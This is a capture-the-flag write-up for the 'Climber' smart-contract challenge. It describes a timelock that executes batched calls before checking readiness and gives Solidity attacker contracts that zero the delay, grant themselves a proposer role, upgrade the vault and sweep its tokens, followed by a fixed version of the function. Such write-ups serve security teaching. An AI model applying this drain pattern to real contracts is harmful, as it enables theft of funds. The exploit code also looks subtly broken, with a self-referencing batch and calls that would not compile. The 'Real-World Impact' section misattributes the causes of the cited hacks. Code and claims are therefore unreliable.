# Challenge #16: Climber

- **Difficulty:** Hard
- **Category:** Timelock Readiness Bypass / Execute-Before-Check
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

`ClimberTimelock` is a timelock controller that schedules and executes batches of calls. It has a `delay()` parameter (initially 1 hour) that should enforce a waiting period between scheduling and execution. The `PROPOSER_ROLE` is required to schedule operations, and `ADMIN_ROLE` can grant roles.

## Vulnerability

The `execute()` function performs all external calls **BEFORE** checking if the operation is ready:

```solidity
function execute(address[] calldata targets, uint256[] calldata values,
                 bytes[] calldata dataElements, bytes32 salt) external payable {
    bytes32 id = getOperationId(targets, values, dataElements, salt);
    
    // ⚠️ EXTERNAL CALLS HAPPEN FIRST
    for (uint256 i = 0; i < targets.length; i++) {
        targets[i].call{value: values[i]}(dataElements[i]);
    }
    
    // ✅ Readiness check happens AFTER all calls executed
    require(isOperationReady(id), "Operation not ready");
    require(isOperationKnown(id), "Unknown operation");
    
    operations[id].setReady();
}
```

This allows an attacker to include role-granting and configuration-changing calls in the same batch as the execution check. The batch can:
1. Set delay to 0
2. Grant `PROPOSER_ROLE` to the attacker
3. Schedule the operation (which now satisfies `isOperationReady` because delay is 0)
4. Schedule itself (self-registering as a known operation)

All within a single `execute()` call.

## Exploit Walkthrough

```solidity
contract ClimberAttacker {
    function attack(address timelock, address vault, address implementation,
                    address token, address recovery) external {
        // Build batch that modifies timelock AND attacks vault
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);
        
        // Call 1: Set delay to 0
        targets[0] = timelock;
        data[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
        
        // Call 2: Grant PROPOSER_ROLE to self
        targets[1] = timelock;
        data[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
        
        // Call 3: Upgrade vault to malicious implementation
        targets[2] = vault;
        data[2] = abi.encodeCall(vault.upgradeToAndCall, (
            implementation,
            abi.encodeCall(ClimberVaultAttack.sweepAll, (token, recovery))
        ));
        
        // Call 4: Self-schedule (register this batch as known + ready)
        targets[3] = address(this);
        data[3] = abi.encodeCall(this.schedule, (timelock, targets, values, data));
        
        // Execute everything in one call
        // The execute() runs all calls first, then checks readiness
        // By the time it checks, delay=0 and we have PROPOSER_ROLE
        timelock.execute(targets, values, data, 0);
    }
    
    function schedule(address timelock, address[] memory targets,
                      uint256[] memory values, bytes[] memory data) external {
        ClimberTimelock(timelock).schedule(targets, values, data, 0);
    }
}

contract ClimberVaultAttack {
    function sweepAll(IERC20 token, address recovery) external {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

## Real-World Impact

- **Nomad Bridge** (August 2022, $190M): Missing readiness validation in cross-chain message processing
- **Fei Protocol** (April 2022, $80M): Timelock bypass via batched calls
- **Harvest Finance** (October 2020, $34M): Flash loan + timelock manipulation

## Remediation

```solidity
// FIX: Check readiness BEFORE executing any calls
function execute(address[] calldata targets, uint256[] calldata values,
                 bytes[] calldata dataElements, bytes32 salt) external payable {
    bytes32 id = getOperationId(targets, values, dataElements, salt);
    
    // ✅ Check FIRST
    require(isOperationReady(id), "Operation not ready");
    require(isOperationKnown(id), "Unknown operation");
    
    // Then execute
    for (uint256 i = 0; i < targets.length; i++) {
        targets[i].call{value: values[i]}(dataElements[i]);
    }
    
    operations[id].setReady();
}
```

## Key Takeaway

> **Timelocks must validate readiness BEFORE any side effects. Execute-before-check patterns allow attackers to modify the very conditions they need to satisfy, turning the scheduler into a complete bypass.**
